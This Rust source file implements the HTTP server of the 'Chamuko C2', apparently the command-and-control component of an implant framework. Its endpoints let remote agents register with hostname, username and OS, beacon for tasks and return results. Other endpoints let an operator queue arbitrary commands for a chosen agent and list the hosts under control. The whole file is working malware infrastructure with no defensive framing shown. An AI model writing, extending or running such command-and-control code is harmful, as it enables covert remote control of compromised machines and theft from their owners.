//! Tiny HTTP server exposing the Chamuko C2 endpoints.

use std::sync::{Arc, Mutex};

use tiny_http::{Header, Method, Response, Server};

use chamuko_protocol::{
    BeaconRequest, BeaconResponse, RegisterRequest, RegisterResponse, ResultsRequest,
};

use crate::state::State;

const JSON: &str = "application/json";

pub fn run(state: Arc<Mutex<State>>, listen: &str) -> std::io::Result<()> {
    let server = Server::http(listen).map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
    eprintln!("[c2] listening on http://{listen}");

    for mut request in server.incoming_requests() {
        let method = request.method().clone();
        let url = request.url().to_string();
        let mut body = String::new();
        let _ = request.as_reader().read_to_string(&mut body);

        let (status, response_body) = handle(&state, &method, &url, &body);
        let content_type = Header::from_bytes(&b"Content-Type"[..], JSON.as_bytes()).unwrap();
        let mut resp = Response::from_string(response_body)
            .with_status_code(status)
            .with_header(content_type);
        if status != 200 {
            // tiny_http requires the status text to be set for non-200.
            resp = resp.with_status_code(status);
        }
        let _ = request.respond(resp);
    }
    Ok(())
}

fn handle(
    state: &Arc<Mutex<State>>,
    method: &Method,
    url: &str,
    body: &str,
) -> (i32, String) {
    match (method, url) {
        (Method::Post, "/register") => handle_register(state, body),
        (Method::Post, "/beacon") => handle_beacon(state, body),
        (Method::Post, "/results") => handle_results(state, body),
        (Method::Post, "/enqueue") => handle_enqueue(state, body),
        (Method::Get, "/agents") => handle_agents(state),
        (Method::Get, "/health") => (200, r#"{"status":"ok"}"#.to_string()),
        _ => (404, r#"{"error":"not found"}"#.to_string()),
    }
}

fn handle_register(state: &Arc<Mutex<State>>, body: &str) -> (i32, String) {
    let req: RegisterRequest = match serde_json::from_str(body) {
        Ok(r) => r,
        Err(e) => return (400, json_err(&e.to_string())),
    };
    let sleep = 5;
    let jitter = 2;
    let id = state.lock().unwrap().register_agent(req.agent, sleep, jitter);
    let resp = RegisterResponse {
        id: id.clone(),
        sleep,
        jitter,
    };
    eprintln!("[c2] agent registered: {id}");
    (200, serde_json::to_string(&resp).unwrap_or_else(|_| String::new()))
}

fn handle_beacon(state: &Arc<Mutex<State>>, body: &str) -> (i32, String) {
    let req: BeaconRequest = match serde_json::from_str(body) {
        Ok(r) => r,
        Err(e) => return (400, json_err(&e.to_string())),
    };
    let tasks = state.lock().unwrap().drain_tasks(&req.id).unwrap_or_default();
    let resp = BeaconResponse { tasks };
    (200, serde_json::to_string(&resp).unwrap_or_else(|_| String::new()))
}

fn handle_results(state: &Arc<Mutex<State>>, body: &str) -> (i32, String) {
    let req: ResultsRequest = match serde_json::from_str(body) {
        Ok(r) => r,
        Err(e) => return (400, json_err(&e.to_string())),
    };
    if state.lock().unwrap().store_results(&req.id, req.results).is_none() {
        return (404, json_err("unknown agent"));
    }
    (200, r#"{"status":"ok"}"#.to_string())
}

#[derive(serde::Deserialize)]
struct EnqueueRequest {
    id: String,
    command: String,
    #[serde(default)]
    args: Vec<String>,
}

fn handle_enqueue(state: &Arc<Mutex<State>>, body: &str) -> (i32, String) {
    let req: EnqueueRequest = match serde_json::from_str(body) {
        Ok(r) => r,
        Err(e) => return (400, json_err(&e.to_string())),
    };
    let task_id = state
        .lock()
        .unwrap()
        .enqueue_task(&req.id, req.command, req.args);
    match task_id {
        Some(id) => (200, format!(r#"{{"task_id":"{id}"}}"#)),
        None => (404, json_err("unknown agent")),
    }
}

fn json_err(msg: &str) -> String {
    format!(r#"{{"error":"{}"}}"#, msg.replace('"', "\\\""))
}

fn handle_agents(state: &Arc<Mutex<State>>) -> (i32, String) {
    let s = state.lock().unwrap();
    let mut out = Vec::new();
    for (id, entry) in s.agents() {
        out.push(serde_json::json!({
            "id": id,
            "hostname": entry.info.hostname,
            "username": entry.info.username,
            "os": entry.info.os,
            "last_seen": entry.last_seen,
            "pending": entry.pending.len(),
            "results": entry.results.len(),
        }));
    }
    (200, serde_json::to_string(&out).unwrap_or_else(|_| "[]".to_string()))
}
